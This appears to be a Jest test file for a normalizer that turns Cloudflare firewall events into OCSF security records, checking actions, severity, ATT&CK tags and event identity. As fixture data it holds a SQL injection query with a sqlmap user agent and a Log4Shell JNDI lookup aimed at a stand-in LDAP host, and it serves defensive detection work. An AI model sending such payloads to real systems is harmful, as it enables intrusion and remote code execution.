import { describe, expect, test } from "@jest/globals";
import { JSONObject } from "../../../../Types/JSON";
import NormalizedSecurityEvent from "../../../../Types/SecurityEvent/NormalizedSecurityEvent";
import OcsfSeverity from "../../../../Types/SecurityEvent/OcsfSeverity";
import EdgeAction, {
  EDGE_ACTION_ATTRIBUTE,
  EDGE_SAMPLE_INTERVAL_ATTRIBUTE,
} from "../../../../Types/SecurityEvent/EdgeAction";
import SecurityEventRequestOutcome, {
  SECURITY_REQUEST_ATTRIBUTES,
} from "../../../../Types/SecurityEvent/SecurityEventRequestOutcome";
import CloudflareNormalizer, {
  CLOUDFLARE_ATTRIBUTES,
  cloudflareValueKey,
} from "../../../../Utils/SecurityEvent/Connectors/CloudflareNormalizer";
import {
  WEB_ATTACK_KIND_ATTRIBUTE,
  WebAttackKind,
} from "../../../../Utils/SecurityEvent/LogParsers/WebAttackLogParser";
import {
  ATTACKER_IP,
  CLOUDFLARE_ZONE,
  CUSTOM_RULE_MANAGED_CHALLENGE,
  HTTP_DDOS_DROP,
  MANAGED_CHALLENGE_PASSED,
  MANAGED_RULE_BLOCK,
  MANAGED_RULE_LOG,
  RATE_LIMIT_BLOCK,
  SAMPLED_BLOCK,
  SECURITY_LEVEL_JS_CHALLENGE,
  SKIP_ALLOWLISTED_MONITOR,
  SKIP_WITH_PATH_TRAVERSAL,
  UNKNOWN_ACTION,
} from "./CloudflareFixtures";

/*
 * Cloudflare's firewall events as OCSF HTTP Activity: one expectation per
 * action Cloudflare takes (what the edge did, the disposition, how far the
 * request got, how serious it is) and per source (what acted), the request
 * and the visitor (address, host, path, query, method, user agent, Ray ID,
 * country, ASN), the sample interval, the event's identity across reads,
 * and which events belong among the project's security events at all.
 */

function normalize(raw: JSONObject): NormalizedSecurityEvent {
  return CloudflareNormalizer.normalize(raw, CLOUDFLARE_ZONE);
}

describe("CloudflareNormalizer - the request and the visitor", () => {
  test("a managed rule's block is HTTP Activity about the request, the visitor and the rule", () => {
    const event: NormalizedSecurityEvent = normalize(MANAGED_RULE_BLOCK);

    expect(event).toMatchObject({
      classUid: 4002,
      className: "HTTP Activity",
      categoryUid: 4,
      categoryName: "Network Activity",
      activityName: "GET",
      statusName: "Blocked",
      vendorName: "Cloudflare",
      productName: "Cloudflare WAF",
      ruleId: "6179ae15870a4bb7b2d480d4843b323c",
      ruleName: "SQLi - Comment",
      principalIp: ATTACKER_IP,
      targetHost: "shop.example.com",
      targetResource: "/products?id=1%27%20or%201%3D1--",
      requestOutcome: SecurityEventRequestOutcome.Rejected,
      severityName: OcsfSeverity.Low,
      mitreTactics: ["TA0001"],
      mitreTechniques: ["T1190"],
    });
    expect(event.time.toISOString()).toBe("2026-11-20T10:42:13.000Z");
    expect(event.observables).toEqual([ATTACKER_IP, "shop.example.com"]);
    expect(event.message).toBe(
      `Cloudflare blocked GET shop.example.com/products?id=1%27%20or%201%3D1-- from ${ATTACKER_IP} (WAF managed rules: SQLi - Comment)`,
    );
  });

  test("the request is kept under OpenTelemetry's names, and Cloudflare's own facts under cloudflare.*", () => {
    const attributes: JSONObject = normalize(MANAGED_RULE_BLOCK).attributes;

    expect(attributes).toMatchObject({
      [SECURITY_REQUEST_ATTRIBUTES.method]: "GET",
      [SECURITY_REQUEST_ATTRIBUTES.url]:
        "https://shop.example.com/products?id=1%27%20or%201%3D1--",
      [SECURITY_REQUEST_ATTRIBUTES.clientAddress]: ATTACKER_IP,
      [SECURITY_REQUEST_ATTRIBUTES.userAgent]:
        "sqlmap/1.7.2#stable (https://sqlmap.org)",
      [SECURITY_REQUEST_ATTRIBUTES.statusCode]: "403",
      [CLOUDFLARE_ATTRIBUTES.rayId]: "8f2a1b3c4d5e6f70",
      [CLOUDFLARE_ATTRIBUTES.zoneId]: CLOUDFLARE_ZONE.zoneTag,
      [CLOUDFLARE_ATTRIBUTES.zoneName]: "example.com",
      [CLOUDFLARE_ATTRIBUTES.action]: "block",
      [CLOUDFLARE_ATTRIBUTES.source]: "firewallManaged",
      [CLOUDFLARE_ATTRIBUTES.ruleId]: "6179ae15870a4bb7b2d480d4843b323c",
      [CLOUDFLARE_ATTRIBUTES.rulesetId]: "efb7b8c949ac4650a09736fc376e9aee",
      [CLOUDFLARE_ATTRIBUTES.ruleDescription]: "SQLi - Comment",
      [CLOUDFLARE_ATTRIBUTES.country]: "BE",
      [CLOUDFLARE_ATTRIBUTES.asn]: "396982",
      [CLOUDFLARE_ATTRIBUTES.asnName]: "GOOGLE-CLOUD-PLATFORM",
      [CLOUDFLARE_ATTRIBUTES.colo]: "BRU",
      [CLOUDFLARE_ATTRIBUTES.edgeStatusCode]: "403",
      [CLOUDFLARE_ATTRIBUTES.matchIndex]: "0",
      [CLOUDFLARE_ATTRIBUTES.sampleInterval]: "1",
      [EDGE_ACTION_ATTRIBUTE]: EdgeAction.Blocked,
      [EDGE_SAMPLE_INTERVAL_ATTRIBUTE]: "1",
      [WEB_ATTACK_KIND_ATTRIBUTE]: WebAttackKind.SqlInjection,
      disposition: "Blocked",
      disposition_id: "2",
    });
    // The origin never answered a blocked request: no origin status is made up.
    expect(attributes[CLOUDFLARE_ATTRIBUTES.originStatusCode]).toBeUndefined();
  });

  test("a query without its question mark reads the same", () => {
    expect(
      normalize({ ...MANAGED_RULE_BLOCK, clientRequestQuery: "id=1" })
        .targetResource,
    ).toBe("/products?id=1");
    expect(
      normalize({ ...MANAGED_RULE_BLOCK, clientRequestQuery: "" })
        .targetResource,
    ).toBe("/products");
  });

  test("a sampled row keeps the requests it stands for", () => {
    const event: NormalizedSecurityEvent = normalize(SAMPLED_BLOCK);

    expect(event.attributes[EDGE_SAMPLE_INTERVAL_ATTRIBUTE]).toBe("10");
    expect(event.attributes[CLOUDFLARE_ATTRIBUTES.sampleInterval]).toBe("10");
  });

  test("an unreadable sample interval stands for the one request", () => {
    for (const sampleInterval of [0, -3, "x", null, 2.5]) {
      expect(
        normalize({ ...MANAGED_RULE_BLOCK, sampleInterval }).attributes[
          EDGE_SAMPLE_INTERVAL_ATTRIBUTE
        ],
      ).toBe("1");
    }
  });
});

describe("CloudflareNormalizer - each action", () => {
  test.each([
    [
      "block",
      MANAGED_RULE_BLOCK,
      EdgeAction.Blocked,
      "Blocked",
      SecurityEventRequestOutcome.Rejected,
      OcsfSeverity.Low,
    ],
    [
      "managed challenge",
      CUSTOM_RULE_MANAGED_CHALLENGE,
      EdgeAction.Challenged,
      "Challenge",
      SecurityEventRequestOutcome.Rejected,
      OcsfSeverity.Low,
    ],
    [
      "JS challenge",
      SECURITY_LEVEL_JS_CHALLENGE,
      EdgeAction.Challenged,
      "Challenge",
      SecurityEventRequestOutcome.Rejected,
      OcsfSeverity.Low,
    ],
    [
      "a challenge passed",
      MANAGED_CHALLENGE_PASSED,
      EdgeAction.PassedChallenge,
      "Allowed",
      undefined,
      OcsfSeverity.Informational,
    ],
    [
      "log, and the origin answered 200",
      MANAGED_RULE_LOG,
      EdgeAction.Logged,
      "Logged",
      SecurityEventRequestOutcome.ReachedApp,
      OcsfSeverity.Medium,
    ],
    [
      "skip, and the origin failed",
      SKIP_WITH_PATH_TRAVERSAL,
      EdgeAction.LetThrough,
      "Allowed",
      SecurityEventRequestOutcome.Errored,
      OcsfSeverity.High,
    ],
    [
      "connection close",
      HTTP_DDOS_DROP,
      EdgeAction.Blocked,
      "Dropped",
      SecurityEventRequestOutcome.Rejected,
      OcsfSeverity.Low,
    ],
    [
      "an action Cloudflare added later",
      UNKNOWN_ACTION,
      EdgeAction.Other,
      "Other",
      undefined,
      OcsfSeverity.Low,
    ],
  ])(
    "%s",
    (
      _name: string,
      raw: JSONObject,
      edgeAction: EdgeAction,
      statusName: string,
      outcome: SecurityEventRequestOutcome | undefined,
      severity: OcsfSeverity,
    ) => {
      const event: NormalizedSecurityEvent = normalize(raw);

      expect(event.attributes[EDGE_ACTION_ATTRIBUTE]).toBe(edgeAction);
      expect(event.statusName).toBe(statusName);
      expect(event.requestOutcome).toBe(outcome);
      expect(event.severityName).toBe(severity);
    },
  );

  test("every spelling Cloudflare uses for an action is read the same way, and stored as its field reference spells it", () => {
    for (const spelling of [
      "managed_challenge",
      "managedChallenge",
      "managedchallenge",
      " MANAGED_CHALLENGE ",
    ]) {
      expect(CloudflareNormalizer.edgeActionFor(spelling)).toBe(
        EdgeAction.Challenged,
      );
      expect(CloudflareNormalizer.canonicalAction(spelling)).toBe(
        "managedChallenge",
      );
    }

    expect(
      CloudflareNormalizer.canonicalAction("managedchallengeinteractivesolved"),
    ).toBe("managedChallengeInteractiveSolved");
    expect(CloudflareNormalizer.canonicalAction("connectionclose")).toBe(
      "connectionClose",
    );
    // Not one Cloudflare documents: stored as it came.
    expect(CloudflareNormalizer.canonicalAction("ai_labyrinth_served")).toBe(
      "ai_labyrinth_served",
    );
  });

  test.each([
    ["challenge_solved", EdgeAction.PassedChallenge],
    ["jschallenge_solved", EdgeAction.PassedChallenge],
    ["challenge_bypassed", EdgeAction.PassedChallenge],
    ["managed_challenge_bypassed", EdgeAction.PassedChallenge],
    ["managed_challenge_interactive_solved", EdgeAction.PassedChallenge],
    ["challenge_failed", EdgeAction.Blocked],
    ["jschallenge_failed", EdgeAction.Blocked],
    ["force_connection_close", EdgeAction.Blocked],
    ["drop", EdgeAction.Blocked],
    ["challenge", EdgeAction.Challenged],
    ["allow", EdgeAction.LetThrough],
    ["bypass", EdgeAction.LetThrough],
    ["skip", EdgeAction.LetThrough],
    ["log", EdgeAction.Logged],
    ["unknown", EdgeAction.Other],
    ["", EdgeAction.Other],
    ["constructor", EdgeAction.Other],
  ])("%s is %s", (action: string, edgeAction: EdgeAction) => {
    expect(CloudflareNormalizer.edgeActionFor(action)).toBe(edgeAction);
  });

  test("a request let through that the origin turned away is Rejected and Low", () => {
    const event: NormalizedSecurityEvent = normalize({
      ...MANAGED_RULE_LOG,
      originResponseStatus: 404,
    });

    expect(event.requestOutcome).toBe(SecurityEventRequestOutcome.Rejected);
    expect(event.severityName).toBe(OcsfSeverity.Low);
  });

  test("a request let through that Cloudflare answered from its cache has no outcome", () => {
    const event: NormalizedSecurityEvent = normalize({
      ...MANAGED_RULE_LOG,
      originResponseStatus: 0,
    });

    expect(event.requestOutcome).toBeUndefined();
    expect(event.severityName).toBe(OcsfSeverity.Medium);
  });

  test("a Log4Shell lookup let through is High whatever the origin answered", () => {
    const event: NormalizedSecurityEvent = normalize({
      ...MANAGED_RULE_LOG,
      clientRequestQuery: "",
      userAgent: "${jndi:ldap://203.0.113.9/a}",
      originResponseStatus: 200,
    });

    expect(event.attributes[WEB_ATTACK_KIND_ATTRIBUTE]).toBe(
      WebAttackKind.Log4Shell,
    );
    expect(event.severityName).toBe(OcsfSeverity.High);
  });
});

describe("CloudflareNormalizer - each source", () => {
  test.each([
    ["firewallManaged", "firewallManaged", "WAF managed rules"],
    ["firewallCustom", "firewallCustom", "WAF custom rules"],
    ["ratelimit", "rateLimit", "Rate limiting rules"],
    ["rateLimit", "rateLimit", "Rate limiting rules"],
    ["ip", "ip", "IP Access rules"],
    ["iprange", "ipRange", "IP Access rules (IP range)"],
    ["asn", "asn", "IP Access rules (ASN)"],
    ["country", "country", "IP Access rules (country)"],
    ["botManagement", "botManagement", "Bot Management"],
    ["botfight", "botFight", "Bot Fight Mode"],
    ["l7ddos", "l7ddos", "HTTP DDoS protection"],
    ["securitylevel", "securityLevel", "Security Level"],
    ["zonelockdown", "zoneLockdown", "Zone Lockdown"],
    ["uablock", "uaBlock", "User Agent Blocking"],
    ["bic", "bic", "Browser Integrity Check"],
    ["hot", "hot", "Hotlink Protection"],
    ["validation", "validation", "Request validation"],
    ["waf", "waf", "WAF (legacy)"],
    ["firewallrules", "firewallRules", "Firewall Rules"],
    ["dlp", "dlp", "Data Loss Prevention"],
    [
      "apishieldschemavalidation",
      "apiShieldSchemaValidation",
      "API Shield schema validation",
    ],
    ["somethingNew", "somethingNew", "somethingNew"],
  ])(
    "%s is stored as %s and named %s",
    (source: string, canonical: string, label: string) => {
      const event: NormalizedSecurityEvent = normalize({
        ...MANAGED_RULE_BLOCK,
        source,
        description: "",
      });

      expect(event.attributes[CLOUDFLARE_ATTRIBUTES.source]).toBe(canonical);
      expect(event.ruleName).toBe(label);
      expect(event.message.endsWith(`(${label})`)).toBe(true);
    },
  );

  test("only rules that look for attacks, or a request that carries one, are ATT&CK's exploit of a public-facing application", () => {
    const rateLimit: NormalizedSecurityEvent = normalize({
      ...RATE_LIMIT_BLOCK,
      clientRequestQuery: "",
    });
    const custom: NormalizedSecurityEvent = normalize(
      CUSTOM_RULE_MANAGED_CHALLENGE,
    );
    const ddos: NormalizedSecurityEvent = normalize(HTTP_DDOS_DROP);
    const traversal: NormalizedSecurityEvent = normalize(
      SKIP_WITH_PATH_TRAVERSAL,
    );

    expect(rateLimit.mitreTechniques).toEqual([]);
    expect(custom.mitreTechniques).toEqual([]);
    expect(ddos.mitreTactics).toEqual(["TA0040"]);
    expect(ddos.mitreTechniques).toEqual(["T1499"]);
    expect(traversal.mitreTechniques).toEqual(["T1190"]);
    expect(traversal.attributes[WEB_ATTACK_KIND_ATTRIBUTE]).toBe(
      WebAttackKind.PathTraversal,
    );
  });

  test("the method is upper case whatever case Cloudflare reports", () => {
    expect(normalize(RATE_LIMIT_BLOCK).activityName).toBe("POST");
  });
});

describe("CloudflareNormalizer - identity and recognition", () => {
  test("the identity is the zone, the Ray ID and the rule's place in the chain, stable across reads", () => {
    expect(normalize(MANAGED_RULE_BLOCK).eventUid).toBe(
      `cloudflare:${CLOUDFLARE_ZONE.zoneTag}:8f2a1b3c4d5e6f70:0:firewallManaged:6179ae15870a4bb7b2d480d4843b323c:block`,
    );
    expect(normalize({ ...MANAGED_RULE_BLOCK }).eventUid).toBe(
      normalize(MANAGED_RULE_BLOCK).eventUid,
    );
    // Spelled another way, the same event is the same event.
    expect(
      normalize({ ...MANAGED_RULE_BLOCK, source: "firewallmanaged" }).eventUid,
    ).toBe(normalize(MANAGED_RULE_BLOCK).eventUid);
  });

  test("two rules acting on one request are two events", () => {
    const logged: string = normalize({
      ...MANAGED_RULE_BLOCK,
      action: "log",
      matchIndex: 1,
    }).eventUid;

    expect(logged).not.toBe(normalize(MANAGED_RULE_BLOCK).eventUid);
  });

  test("a sampled read of the same row is the same event", () => {
    expect(
      normalize({ ...MANAGED_RULE_BLOCK, sampleInterval: 10 }).eventUid,
    ).toBe(normalize(MANAGED_RULE_BLOCK).eventUid);
  });

  test("a row without a Ray ID is identified by its content", () => {
    const withoutRay: JSONObject = { ...MANAGED_RULE_BLOCK, rayName: "" };

    expect(normalize(withoutRay).eventUid).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(normalize({ ...withoutRay }).eventUid).toBe(
      normalize(withoutRay).eventUid,
    );
  });

  test("a firewall event is recognized; anything else is not", () => {
    expect(CloudflareNormalizer.isRecognized(MANAGED_RULE_BLOCK)).toBe(true);
    expect(
      CloudflareNormalizer.isRecognized({
        ...MANAGED_RULE_BLOCK,
        rayName: "",
      }),
    ).toBe(true);
    expect(
      CloudflareNormalizer.isRecognized({ ...MANAGED_RULE_BLOCK, action: "" }),
    ).toBe(false);
    expect(
      CloudflareNormalizer.isRecognized({
        ...MANAGED_RULE_BLOCK,
        datetime: "not a time",
      }),
    ).toBe(false);
    expect(
      CloudflareNormalizer.isRecognized({
        ...MANAGED_RULE_BLOCK,
        rayName: "",
        clientIP: "",
      }),
    ).toBe(false);
    expect(
      CloudflareNormalizer.isRecognized({ message: "error", code: 1 }),
    ).toBe(false);
  });

  test("a request the customer's own rule let through belongs only when it carries an attack", () => {
    expect(
      CloudflareNormalizer.isSecurityRelevant(SKIP_ALLOWLISTED_MONITOR),
    ).toBe(false);
    expect(
      CloudflareNormalizer.isSecurityRelevant(SKIP_WITH_PATH_TRAVERSAL),
    ).toBe(true);
    expect(
      CloudflareNormalizer.isSecurityRelevant({
        ...SKIP_ALLOWLISTED_MONITOR,
        wafAttackScoreClass: "likely_attack",
      }),
    ).toBe(true);
    expect(
      CloudflareNormalizer.isSecurityRelevant({
        ...SKIP_ALLOWLISTED_MONITOR,
        wafAttackScoreClass: "clean",
      }),
    ).toBe(false);

    // Whatever else Cloudflare did is a security event.
    for (const raw of [
      MANAGED_RULE_BLOCK,
      CUSTOM_RULE_MANAGED_CHALLENGE,
      MANAGED_CHALLENGE_PASSED,
      MANAGED_RULE_LOG,
      RATE_LIMIT_BLOCK,
      HTTP_DDOS_DROP,
      UNKNOWN_ACTION,
    ]) {
      expect(CloudflareNormalizer.isSecurityRelevant(raw)).toBe(true);
    }
  });

  test("the value key ignores case and separators", () => {
    expect(cloudflareValueKey("Managed_Challenge-Non Interactive")).toBe(
      "managedchallengenoninteractive",
    );
  });

  test("a challenge passed names the challenged request", () => {
    expect(
      normalize(MANAGED_CHALLENGE_PASSED).attributes[
        CLOUDFLARE_ATTRIBUTES.originatorRayId
      ],
    ).toBe("8f2a1b3c4d5e6f71");
  });
});
